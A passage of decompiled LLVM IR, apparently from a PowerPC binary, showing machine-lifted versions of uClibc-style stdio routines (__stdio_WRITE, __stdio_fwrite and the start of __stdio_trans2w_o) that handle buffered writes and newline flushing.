  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10011744 = inttoptr i32 %v0_10011738 to i32*
  store i32 84, i32* %v2_10011744, align 4
  %v0_100117bc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100117b8

dec_label_pc_1001174c:                            ; preds = %dec_label_pc_10011788
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_100117a8.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100117a4

dec_label_pc_10011758:                            ; preds = %dec_label_pc_10011720, %dec_label_pc_10011714, %dec_label_pc_1001172c
  %v2_100117887 = phi i32 [ %v2_10011724, %dec_label_pc_10011720 ], [ %v0_10011700, %dec_label_pc_10011714 ], [ %v2_1001172411, %dec_label_pc_1001172c ]
  %v0_10011758 = load i32, i32* @r5, align 4
  %v1_10011758 = load i32, i32* @r6, align 4
  %v3_10011758 = icmp ugt i32 %v0_10011758, %v1_10011758
  br i1 %v3_10011758, label %dec_label_pc_10011760, label %dec_label_pc_10011764

dec_label_pc_10011760:                            ; preds = %dec_label_pc_10011758
  store i32 %v1_10011758, i32* @r5, align 4
  br label %dec_label_pc_10011764

dec_label_pc_10011764:                            ; preds = %dec_label_pc_10011758, %dec_label_pc_10011760
  %v0_10011770 = phi i32 [ %v0_10011758, %dec_label_pc_10011758 ], [ %v1_10011758, %dec_label_pc_10011760 ]
  %v1_10011764 = add i32 %v0_10011770, 1
  store i32 %v1_10011764, i32* %r0.global-to-local, align 4
  %v0_10011768 = load i32, i32* @r4, align 4
  %v1_10011768 = inttoptr i32 %v0_10011768 to i32*
  %v2_10011768 = load i32, i32* %v1_10011768, align 4
  store i32 %v2_10011768, i32* %r11.global-to-local, align 4
  store i32 %v0_10011770, i32* %r9.global-to-local, align 4
  store i32 %v0_10011770, i32* %ctr.global-to-local, align 4
  %v2_100117a03 = icmp eq i32 %v0_10011770, 0
  br i1 %v2_100117a03, label %dec_label_pc_100117a4, label %dec_label_pc_10011778.preheader

dec_label_pc_10011778.preheader:                  ; preds = %dec_label_pc_10011764
  %v1_1001177816 = inttoptr i32 %v2_10011768 to i32*
  %v2_1001177817 = load i32, i32* %v1_1001177816, align 4
  store i32 %v2_1001177817, i32* %r0.global-to-local, align 4
  %v1_1001177c18 = add i32 %v2_10011768, 4
  store i32 %v1_1001177c18, i32* %r11.global-to-local, align 4
  %v2_1001178020 = icmp ugt i32 %v2_1001177817, 127
  br i1 %v2_1001178020, label %dec_label_pc_10011738, label %dec_label_pc_10011788.lr.ph

dec_label_pc_10011788.lr.ph:                      ; preds = %dec_label_pc_10011778.preheader
  %extract.t = trunc i32 %v2_1001177817 to i8
  br label %dec_label_pc_10011788

dec_label_pc_10011788:                            ; preds = %dec_label_pc_10011788.lr.ph, %dec_label_pc_10011798.dec_label_pc_10011778_crit_edge
  %v2_1001177823.off0 = phi i8 [ %extract.t, %dec_label_pc_10011788.lr.ph ], [ %extract.t24, %dec_label_pc_10011798.dec_label_pc_10011778_crit_edge ]
  %v2_1001178822 = phi i32 [ %v2_100117887, %dec_label_pc_10011788.lr.ph ], [ %v2_10011798, %dec_label_pc_10011798.dec_label_pc_10011778_crit_edge ]
  %v3_10011788 = inttoptr i32 %v2_1001178822 to i8*
  store i8 %v2_1001177823.off0, i8* %v3_10011788, align 1
  %v0_1001178c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001178c = urem i32 %v0_1001178c, 256
  store i32 %v1_1001178c, i32* %r0.global-to-local, align 4
  %v3_10011790 = icmp eq i32 %v1_1001178c, 0
  br i1 %v3_10011790, label %dec_label_pc_1001174c, label %dec_label_pc_10011798

dec_label_pc_10011798:                            ; preds = %dec_label_pc_10011788
  %v0_10011798 = load i32, i32* @r3, align 4
  %v1_10011798 = load i32, i32* %r10.global-to-local, align 4
  %v2_10011798 = add i32 %v1_10011798, %v0_10011798
  store i32 %v2_10011798, i32* @r3, align 4
  %v0_1001179c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001179c = add i32 %v0_1001179c, -1
  store i32 %v1_1001179c, i32* %r9.global-to-local, align 4
  %v0_100117a0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100117a0 = add i32 %v0_100117a0, -1
  store i32 %v1_100117a0, i32* %ctr.global-to-local, align 4
  %v2_100117a0 = icmp eq i32 %v1_100117a0, 0
  br i1 %v2_100117a0, label %dec_label_pc_100117a4, label %dec_label_pc_10011798.dec_label_pc_10011778_crit_edge

dec_label_pc_10011798.dec_label_pc_10011778_crit_edge: ; preds = %dec_label_pc_10011798
  %v0_10011778.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10011778 = inttoptr i32 %v0_10011778.pre to i32*
  %v2_10011778 = load i32, i32* %v1_10011778, align 4
  store i32 %v2_10011778, i32* %r0.global-to-local, align 4
  %v1_1001177c = add i32 %v0_10011778.pre, 4
  store i32 %v1_1001177c, i32* %r11.global-to-local, align 4
  %v2_10011780 = icmp ugt i32 %v2_10011778, 127
  %extract.t24 = trunc i32 %v2_10011778 to i8
  br i1 %v2_10011780, label %dec_label_pc_10011738, label %dec_label_pc_10011788

dec_label_pc_100117a4:                            ; preds = %dec_label_pc_10011798, %dec_label_pc_10011764, %dec_label_pc_1001174c
  %v0_100117a8 = phi i32 [ %v0_100117a8.pre, %dec_label_pc_1001174c ], [ %v2_100117887, %dec_label_pc_10011764 ], [ %v2_10011798, %dec_label_pc_10011798 ]
  %v2_100117a4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100117a4, i32* %r0.global-to-local, align 4
  %v4_100117a8 = icmp eq i32 %v0_100117a8, %v2_100117a4
  br i1 %v4_100117a8, label %dec_label_pc_100117b4, label %dec_label_pc_100117b0

dec_label_pc_100117b0:                            ; preds = %dec_label_pc_100117a4
  %v0_100117b0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100117b0 = load i32, i32* @r4, align 4
  %v2_100117b0 = inttoptr i32 %v1_100117b0 to i32*
  store i32 %v0_100117b0, i32* %v2_100117b0, align 4
  br label %dec_label_pc_100117b4

dec_label_pc_100117b4:                            ; preds = %dec_label_pc_100117a4, %dec_label_pc_100117b0
  %v0_100117b4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100117b4 = load i32, i32* @r5, align 4
  %v2_100117b4 = sub i32 %v1_100117b4, %v0_100117b4
  store i32 %v2_100117b4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100117b8

dec_label_pc_100117b8:                            ; preds = %dec_label_pc_10011738, %dec_label_pc_100117b4
  %v0_100117bc = phi i32 [ %v0_100117bc.pre, %dec_label_pc_10011738 ], [ %v2_100117b4, %dec_label_pc_100117b4 ]
  store i32 %v0_10011704, i32* %r0.global-to-local, align 4
  ret i32 %v0_100117bc

; uselistorder directives
  uselistorder i32 %v1_100117a0, { 1, 0 }
  uselistorder i32 %v2_10011798, { 0, 2, 1 }
  uselistorder i32 %v1_1001178c, { 1, 0 }
  uselistorder i32 %v0_10011770, { 2, 3, 0, 1 }
  uselistorder i32 %v2_100117887, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 4, 5, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 7, 8, 5, 3, 6 }
  uselistorder i32 84, { 4, 5, 3, 2, 1, 0, 6 }
  uselistorder label %dec_label_pc_100117b8, { 1, 0 }
  uselistorder label %dec_label_pc_100117b4, { 1, 0 }
  uselistorder label %dec_label_pc_10011788, { 1, 0 }
  uselistorder label %dec_label_pc_10011764, { 1, 0 }
  uselistorder label %dec_label_pc_10011758, { 2, 0, 1 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_100117cc = load i32, i32* @lr, align 4
  store i32 %v0_100117cc, i32* %r0.global-to-local, align 4
  %v0_100117d8 = load i32, i32* @r5, align 4
  store i32 %v0_100117d8, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_100117d8, i32* @r31, align 4
  %v3_100117ec3 = icmp eq i32 %v0_100117d8, 0
  store i32 %v0_100117d8, i32* @r27, align 4
  br i1 %v3_100117ec3, label %dec_label_pc_10011894, label %dec_label_pc_100117fc

dec_label_pc_100117fc:                            ; preds = %entry, %dec_label_pc_1001181c
  %v0_1001180c = phi i32 [ %v2_1001181c, %dec_label_pc_1001181c ], [ %arg2, %entry ]
  %v1_100117fc.in = phi i32 [ %v2_10011820, %dec_label_pc_1001181c ], [ %v0_100117d8, %entry ]
  %v1_100117fc = icmp sgt i32 %v1_100117fc.in, 0
  br i1 %v1_100117fc, label %dec_label_pc_10011808, label %dec_label_pc_10011800

dec_label_pc_10011800:                            ; preds = %dec_label_pc_100117fc
  br label %dec_label_pc_10011808

dec_label_pc_10011808:                            ; preds = %dec_label_pc_100117fc, %dec_label_pc_10011800
  %v0_10011808 = load i32, i32* @r30, align 4
  %v1_10011808 = add i32 %v0_10011808, 4
  %v2_10011808 = inttoptr i32 %v1_10011808 to i32*
  %v3_10011808 = load i32, i32* %v2_10011808, align 4
  store i32 268507156, i32* @lr, align 4
  %v3_10011810 = call i32 @__libc_write(i32 %v3_10011808, i32 %v0_1001180c)
  %v1_10011814 = icmp slt i32 %v3_10011810, 0
  br i1 %v1_10011814, label %dec_label_pc_10011828, label %dec_label_pc_1001181c

dec_label_pc_1001181c:                            ; preds = %dec_label_pc_10011808
  %v0_1001181c = load i32, i32* @r29, align 4
  %v2_1001181c = add i32 %v0_1001181c, %v3_10011810
  store i32 %v2_1001181c, i32* @r29, align 4
  %v1_10011820 = load i32, i32* @r31, align 4
  %v2_10011820 = sub i32 %v1_10011820, %v3_10011810
  store i32 %v2_10011820, i32* @r31, align 4
  %v3_100117ec = icmp eq i32 %v2_10011820, 0
  store i32 %v2_10011820, i32* @r27, align 4
  br i1 %v3_100117ec, label %dec_label_pc_100117ec.dec_label_pc_10011894.loopexit_crit_edge, label %dec_label_pc_100117fc

dec_label_pc_10011828:                            ; preds = %dec_label_pc_10011808
  %v0_10011828 = load i32, i32* @r30, align 4
  %v1_10011828 = add i32 %v0_10011828, 8
  %v2_10011828 = inttoptr i32 %v1_10011828 to i32*
  %v3_10011828 = load i32, i32* %v2_10011828, align 4
  store i32 %v3_10011828, i32* %r11.global-to-local, align 4
  %v1_1001182c = add i32 %v0_10011828, 12
  %v2_1001182c = inttoptr i32 %v1_1001182c to i32*
  %v3_1001182c = load i32, i32* %v2_1001182c, align 4
  store i32 %v3_1001182c, i32* %r0.global-to-local, align 4
  %v1_10011830 = inttoptr i32 %v0_10011828 to i16*
  %v2_10011830 = load i16, i16* %v1_10011830, align 2
  %v2_10011834 = sub i32 %v3_1001182c, %v3_10011828
  store i32 %v2_10011834, i32* %r0.global-to-local, align 4
  %v5_10011834 = icmp eq i32 %v2_10011834, 0
  %v1_10011838 = or i16 %v2_10011830, 8
  store i16 %v1_10011838, i16* %v1_10011830, align 2
  br i1 %v5_10011834, label %dec_label_pc_10011828.dec_label_pc_10011890_crit_edge, label %dec_label_pc_10011844

dec_label_pc_10011828.dec_label_pc_10011890_crit_edge: ; preds = %dec_label_pc_10011828
  %v0_10011890.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011890

dec_label_pc_10011844:                            ; preds = %dec_label_pc_10011828
  %v0_10011844 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011844 = load i32, i32* @r31, align 4
  %v3_10011844 = icmp ugt i32 %v0_10011844, %v1_10011844
  br i1 %v3_10011844, label %dec_label_pc_10011844.dec_label_pc_10011850_crit_edge, label %dec_label_pc_1001184c

dec_label_pc_10011844.dec_label_pc_10011850_crit_edge: ; preds = %dec_label_pc_10011844
  %v0_10011850.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10011850

dec_label_pc_1001184c:                            ; preds = %dec_label_pc_10011844
  store i32 %v0_10011844, i32* @r27, align 4
  br label %dec_label_pc_10011850

dec_label_pc_10011850:                            ; preds = %dec_label_pc_10011844.dec_label_pc_10011850_crit_edge, %dec_label_pc_1001184c
  %v0_10011850 = phi i32 [ %v0_10011850.pre, %dec_label_pc_10011844.dec_label_pc_10011850_crit_edge ], [ %v0_10011844, %dec_label_pc_1001184c ]
  store i32 %v0_10011850, i32* %ctr.global-to-local, align 4
  %v2_1001185c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011854

dec_label_pc_10011854:                            ; preds = %dec_label_pc_10011878, %dec_label_pc_10011850
  %v2_1001185c = phi i32 [ %v1_10011878, %dec_label_pc_10011878 ], [ %v2_1001185c.pre, %dec_label_pc_10011850 ]
  %v0_10011854 = load i32, i32* @r29, align 4
  %v1_10011854 = inttoptr i32 %v0_10011854 to i8*
  %v2_10011854 = load i8, i8* %v1_10011854, align 1
  %v3_10011854 = zext i8 %v2_10011854 to i32
  store i32 %v3_10011854, i32* %r0.global-to-local, align 4
  %v1_10011858 = add i32 %v0_10011854, 1
  store i32 %v1_10011858, i32* @r29, align 4
  %v3_1001185c = inttoptr i32 %v2_1001185c to i8*
  store i8 %v2_10011854, i8* %v3_1001185c, align 1
  %v0_10011860 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011860 = urem i32 %v0_10011860, 256
  store i32 %v1_10011860, i32* %r0.global-to-local, align 4
  %v3_10011864 = icmp eq i32 %v1_10011860, 10
  br i1 %v3_10011864, label %dec_label_pc_1001186c, label %dec_label_pc_10011878

dec_label_pc_1001186c:                            ; preds = %dec_label_pc_10011854
  %v0_1001186c = load i32, i32* @r30, align 4
  %v1_1001186c = inttoptr i32 %v0_1001186c to i16*
  %v2_1001186c = load i16, i16* %v1_1001186c, align 2
  %v3_1001186c = zext i16 %v2_1001186c to i32
  store i32 %v3_1001186c, i32* %r0.global-to-local, align 4
  %v1_10011870 = and i32 %v3_1001186c, 256
  %v3_10011870 = icmp eq i32 %v1_10011870, 0
  br i1 %v3_10011870, label %dec_label_pc_10011878, label %dec_label_pc_1001186c.dec_label_pc_10011880_crit_edge

dec_label_pc_1001186c.dec_label_pc_10011880_crit_edge: ; preds = %dec_label_pc_1001186c
  %v0_10011884.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011880

dec_label_pc_10011878:                            ; preds = %dec_label_pc_1001186c, %dec_label_pc_10011854
  %v0_10011878 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011878 = add i32 %v0_10011878, 1
  store i32 %v1_10011878, i32* %r11.global-to-local, align 4
  %v0_1001187c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001187c = add i32 %v0_1001187c, -1
  store i32 %v1_1001187c, i32* %ctr.global-to-local, align 4
  %v2_1001187c = icmp eq i32 %v1_1001187c, 0
  br i1 %v2_1001187c, label %dec_label_pc_10011878.dec_label_pc_10011880_crit_edge, label %dec_label_pc_10011854

dec_label_pc_10011878.dec_label_pc_10011880_crit_edge: ; preds = %dec_label_pc_10011878
  %v0_10011880.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10011880

dec_label_pc_10011880:                            ; preds = %dec_label_pc_1001186c.dec_label_pc_10011880_crit_edge, %dec_label_pc_10011878.dec_label_pc_10011880_crit_edge
  %v0_10011884 = phi i32 [ %v1_10011878, %dec_label_pc_10011878.dec_label_pc_10011880_crit_edge ], [ %v0_10011884.pre, %dec_label_pc_1001186c.dec_label_pc_10011880_crit_edge ]
  %v0_10011880 = phi i32 [ %v0_10011880.pre, %dec_label_pc_10011878.dec_label_pc_10011880_crit_edge ], [ %v0_1001186c, %dec_label_pc_1001186c.dec_label_pc_10011880_crit_edge ]
  %v1_10011880 = add i32 %v0_10011880, 8
  %v2_10011880 = inttoptr i32 %v1_10011880 to i32*
  %v3_10011880 = load i32, i32* %v2_10011880, align 4
  store i32 %v3_10011880, i32* %r0.global-to-local, align 4
  %v2_10011884 = add i32 %v0_10011880, 16
  %v3_10011884 = inttoptr i32 %v2_10011884 to i32*
  store i32 %v0_10011884, i32* %v3_10011884, align 4
  %v0_10011888 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011888 = load i32, i32* %r11.global-to-local, align 4
  %v2_10011888 = sub i32 %v1_10011888, %v0_10011888
  store i32 %v2_10011888, i32* %r0.global-to-local, align 4
  %v1_1001188c = load i32, i32* @r31, align 4
  %v2_1001188c = sub i32 %v1_1001188c, %v2_10011888
  store i32 %v2_1001188c, i32* @r31, align 4
  br label %dec_label_pc_10011890

dec_label_pc_10011890:                            ; preds = %dec_label_pc_10011828.dec_label_pc_10011890_crit_edge, %dec_label_pc_10011880
  %v0_10011890 = phi i32 [ %v0_10011890.pre, %dec_label_pc_10011828.dec_label_pc_10011890_crit_edge ], [ %v2_1001188c, %dec_label_pc_10011880 ]
  %v1_10011890 = load i32, i32* @r28, align 4
  %v2_10011890 = sub i32 %v1_10011890, %v0_10011890
  store i32 %v2_10011890, i32* @r28, align 4
  br label %dec_label_pc_10011894

dec_label_pc_100117ec.dec_label_pc_10011894.loopexit_crit_edge: ; preds = %dec_label_pc_1001181c
  %v0_10011898.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10011894

dec_label_pc_10011894:                            ; preds = %entry, %dec_label_pc_100117ec.dec_label_pc_10011894.loopexit_crit_edge, %dec_label_pc_10011890
  %v0_10011898 = phi i32 [ %v2_10011890, %dec_label_pc_10011890 ], [ %v0_10011898.pre.pre, %dec_label_pc_100117ec.dec_label_pc_10011894.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_100117cc, i32* %r0.global-to-local, align 4
  ret i32 %v0_10011898

; uselistorder directives
  uselistorder i32 %v0_10011880, { 1, 0 }
  uselistorder i32 %v1_1001187c, { 1, 0 }
  uselistorder i32 %v1_10011878, { 0, 2, 1 }
  uselistorder i32 %v1_10011860, { 1, 0 }
  uselistorder i32 %v2_10011820, { 1, 3, 2, 0 }
  uselistorder i32 %v2_1001181c, { 1, 0 }
  uselistorder i32 %v3_10011810, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 (i32, i32)* @__libc_write, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10011894, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10011890, { 1, 0 }
  uselistorder label %dec_label_pc_10011880, { 1, 0 }
  uselistorder label %dec_label_pc_10011850, { 1, 0 }
  uselistorder label %dec_label_pc_10011808, { 1, 0 }
  uselistorder label %dec_label_pc_100117fc, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_100118ac = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_100118c8 = load i16, i16* %arg3, align 2
  %v1_100118cc = and i16 %v3_100118c8, 512
  %v3_100118cc = icmp eq i16 %v1_100118cc, 0
  br i1 %v3_100118cc, label %dec_label_pc_100118d4, label %dec_label_pc_100119e0

dec_label_pc_100118d4:                            ; preds = %entry
  %v2_100118d4 = add i32 %tmp, 4
  %v3_100118d4 = inttoptr i32 %v2_100118d4 to i32*
  %v4_100118d4 = load i32, i32* %v3_100118d4, align 4
  %v2_100118d8 = add i32 %tmp, 16
  %v3_100118d8 = inttoptr i32 %v2_100118d8 to i32*
  %v4_100118d8 = load i32, i32* %v3_100118d8, align 4
  store i32 %v4_100118d8, i32* @r3, align 4
  %v3_100118dc = icmp eq i32 %v4_100118d4, -2
  %v2_100118e0 = add i32 %tmp, 12
  %v3_100118e0 = inttoptr i32 %v2_100118e0 to i32*
  %v4_100118e0 = load i32, i32* %v3_100118e0, align 4
  %v2_100118e8 = sub i32 %v4_100118e0, %v4_100118d8
  br i1 %v3_100118dc, label %dec_label_pc_100118e8, label %dec_label_pc_10011918

dec_label_pc_100118e8:                            ; preds = %dec_label_pc_100118d4
  %v3_100118f0 = icmp ult i32 %v2_100118e8, %arg2
  br i1 %v3_100118f0, label %dec_label_pc_100118f8, label %dec_label_pc_100118fc

dec_label_pc_100118f8:                            ; preds = %dec_label_pc_100118e8
  br label %dec_label_pc_100118fc

dec_label_pc_100118fc:                            ; preds = %dec_label_pc_100118e8, %dec_label_pc_100118f8
  %storemerge = phi i32 [ %v2_100118e8, %dec_label_pc_100118f8 ], [ %arg2, %dec_label_pc_100118e8 ]
  %v0_10011900 = phi i32 [ %v2_100118e8, %dec_label_pc_100118f8 ], [ %arg2, %dec_label_pc_100118e8 ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_10011900, i32* @r5, align 4
  store i32 268507400, i32* @lr, align 4
  %v0_10011904 = call i32 @memcpy()
  %v0_10011908 = load i32, i32* @r30, align 4
  %v1_10011908 = add i32 %v0_10011908, 16
  %v2_10011908 = inttoptr i32 %v1_10011908 to i32*
  %v3_10011908 = load i32, i32* %v2_10011908, align 4
  %v1_1001190c = load i32, i32* @r31, align 4
  %v2_1001190c = add i32 %v1_1001190c, %v3_10011908
  store i32 %v2_1001190c, i32* %v2_10011908, align 4
  br label %dec_label_pc_10011a00

dec_label_pc_10011918:                            ; preds = %dec_label_pc_100118d4
  %v3_1001191c = icmp ult i32 %v2_100118e8, %arg2
  br i1 %v3_1001191c, label %dec_label_pc_100119bc, label %dec_label_pc_10011924

dec_label_pc_10011924:                            ; preds = %dec_label_pc_10011918
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268507440, i32* @lr, align 4
  %v0_1001192c = call i32 @memcpy()
  %v0_10011930 = load i32, i32* @r30, align 4
  %v1_10011930 = inttoptr i32 %v0_10011930 to i16*
  %v2_10011930 = load i16, i16* %v1_10011930, align 2
  %v1_10011934 = add i32 %v0_10011930, 16
  %v2_10011934 = inttoptr i32 %v1_10011934 to i32*
  %v3_10011934 = load i32, i32* %v2_10011934, align 4
  %v1_10011938 = and i16 %v2_10011930, 256
  %v3_10011938 = icmp eq i16 %v1_10011938, 0
  %v1_1001193c = load i32, i32* @r29, align 4
  %v2_1001193c = add i32 %v1_1001193c, %v3_10011934
  store i32 %v2_1001193c, i32* %v2_10011934, align 4
  br i1 %v3_10011938, label %dec_label_pc_10011a00, label %dec_label_pc_10011948

dec_label_pc_10011948:                            ; preds = %dec_label_pc_10011924
  %v0_10011948 = load i32, i32* @r28, align 4
  %v0_10011950 = load i32, i32* @r29, align 4
  store i32 268507480, i32* @lr, align 4
  %v4_10011954 = call i32 @memrchr(i32 %v0_10011948, i32 10, i32 %v0_10011950, i32 %v2_1001193c)
  %v3_10011958 = icmp eq i32 %v4_10011954, 0
  br i1 %v3_10011958, label %dec_label_pc_10011a00, label %dec_label_pc_10011960

dec_label_pc_10011960:                            ; preds = %dec_label_pc_10011948
  %v0_10011960 = load i32, i32* @r30, align 4
  store i32 %v0_10011960, i32* @r3, align 4
  store i32 268507496, i32* @lr, align 4
  %v0_10011964 = call i32 @__stdio_wcommit()
  %v3_10011968 = icmp eq i32 %v0_10011964, 0
  br i1 %v3_10011968, label %dec_label_pc_10011a00, label %dec_label_pc_10011970

dec_label_pc_10011970:                            ; preds = %dec_label_pc_10011960
  %v0_10011970 = load i32, i32* @r29, align 4
  %v3_10011970 = icmp ugt i32 %v0_10011970, %v0_10011964
  %v0_10011964.v0_10011974 = select i1 %v3_10011970, i32 %v0_10011964, i32 %v0_10011970
  store i32 %v0_10011964.v0_10011974, i32* @r31, align 4
  %v2_10011980 = sub i32 %v0_10011970, %v0_10011964.v0_10011974
  %v0_10011988 = load i32, i32* @r28, align 4
  %v2_10011988 = add i32 %v0_10011988, %v2_10011980
  store i32 %v2_10011988, i32* @r28, align 4
  store i32 %v2_10011988, i32* @r3, align 4
  store i32 268507544, i32* @lr, align 4
  %v3_10011994 = call i32 @__GI_memchr(i32 %v2_10011988, i32 10, i32 %v0_10011964.v0_10011974)
  %v3_10011998 = icmp eq i32 %v3_10011994, 0
  br i1 %v3_10011998, label %dec_label_pc_10011a00, label %dec_label_pc_100119a0

dec_label_pc_100119a0:                            ; preds = %dec_label_pc_10011970
  %v0_100119a0 = load i32, i32* @r30, align 4
  %v1_100119a0 = add i32 %v0_100119a0, 16
  %v2_100119a0 = inttoptr i32 %v1_100119a0 to i32*
  %v3_100119a0 = load i32, i32* %v2_100119a0, align 4
  %v0_100119a4 = load i32, i32* @r28, align 4
  %v1_100119a4 = load i32, i32* @r31, align 4
  %v2_100119a4 = sub i32 %v0_100119a4, %v3_10011994
  %v2_100119a8 = add i32 %v2_100119a4, %v1_100119a4
  %v2_100119ac = sub i32 %v3_100119a0, %v2_100119a8
  %v1_100119b0 = load i32, i32* @r29, align 4
  %v2_100119b0 = sub i32 %v1_100119b0, %v2_100119a8
  store i32 %v2_100119b0, i32* @r29, align 4
  store i32 %v2_100119ac, i32* %v2_100119a0, align 4
  br label %dec_label_pc_10011a00

dec_label_pc_100119bc:                            ; preds = %dec_label_pc_10011918
  %v2_100119bc = add i32 %tmp, 8
  %v3_100119bc = inttoptr i32 %v2_100119bc to i32*
  %v4_100119bc = load i32, i32* %v3_100119bc, align 4
  %v4_100119c0 = icmp eq i32 %v4_100118d8, %v4_100119bc
  br i1 %v4_100119c0, label %dec_label_pc_100119e0, label %dec_label_pc_100119c8

dec_label_pc_100119c8:                            ; preds = %dec_label_pc_100119bc
  store i32 %tmp, i32* @r3, align 4
  store i32 268507600, i32* @lr, align 4
  %v0_100119cc = call i32 @__stdio_wcommit()
  %v3_100119d0 = icmp eq i32 %v0_100119cc, 0
  br i1 %v3_100119d0, label %dec_label_pc_100119c8.dec_label_pc_100119e0_crit_edge, label %dec_label_pc_100119d8

dec_label_pc_100119c8.dec_label_pc_100119e0_crit_edge: ; preds = %dec_label_pc_100119c8
  %v0_100119e4.pre = load i32, i32* @r30, align 4
  %v0_100119e8.pre = load i32, i32* @r28, align 4
  %v0_100119ec.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100119e0

dec_label_pc_100119d8:                            ; preds = %dec_label_pc_100119c8
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10011a00

dec_label_pc_100119e0:                            ; preds = %dec_label_pc_100119c8.dec_label_pc_100119e0_crit_edge, %entry, %dec_label_pc_100119bc
  %v0_100119ec = phi i32 [ %v0_100119ec.pre, %dec_label_pc_100119c8.dec_label_pc_100119e0_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_100119bc ]
  %v0_100119e8 = phi i32 [ %v0_100119e8.pre, %dec_label_pc_100119c8.dec_label_pc_100119e0_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_100119bc ]
  %v0_100119e4 = phi i32 [ %v0_100119e4.pre, %dec_label_pc_100119c8.dec_label_pc_100119e0_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_100119bc ]
  %v1_100119e4 = inttoptr i32 %v0_100119e4 to i16*
  store i32 %v0_100119ec, i32* @r5, align 4
  store i32 %v0_100118ac, i32* @lr, align 4
  %v5_100119fc = call i32 @__stdio_WRITE(i16* %v1_100119e4, i32 %v0_100119e8)
  br label %dec_label_pc_10011a00

dec_label_pc_10011a00:                            ; preds = %dec_label_pc_10011970, %dec_label_pc_10011960, %dec_label_pc_10011948, %dec_label_pc_10011924, %dec_label_pc_100119d8, %dec_label_pc_100119a0, %dec_label_pc_100118fc, %dec_label_pc_100119e0
  %v0_10011a04 = load i32, i32* @r29, align 4
  ret i32 %v0_10011a04

; uselistorder directives
  uselistorder i32 %v2_100119a8, { 1, 0 }
  uselistorder i32 %v0_10011964.v0_10011974, { 0, 2, 1 }
  uselistorder i32 %v0_10011970, { 1, 0, 2 }
  uselistorder i32 %v2_100118e8, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10011a00, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_100119e0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100118fc, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10011a18 = load i32, i32* @lr, align 4
  store i32 %v0_10011a18, i32* %r0.global-to-local, align 4
  %v0_10011a20 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10011a2c = load i16, i16* %arg1, align 2
  %v4_10011a2c = zext i16 %v3_10011a2c to i32
  store i32 %v4_10011a2c, i32* %r0.global-to-local, align 4
  %v1_10011a30 = load i32, i32* @r4, align 4
  %v2_10011a30 = and i32 %v1_10011a30, %v4_10011a2c
  store i32 %v2_10011a30, i32* %r9.global-to-local, align 4
  %v5_10011a30 = icmp eq i32 %v2_10011a30, 0
  br i1 %v5_10011a30, label %dec_label_pc_10011a38, label %dec_label_pc_10011a48

dec_label_pc_10011a38:                            ; preds = %entry
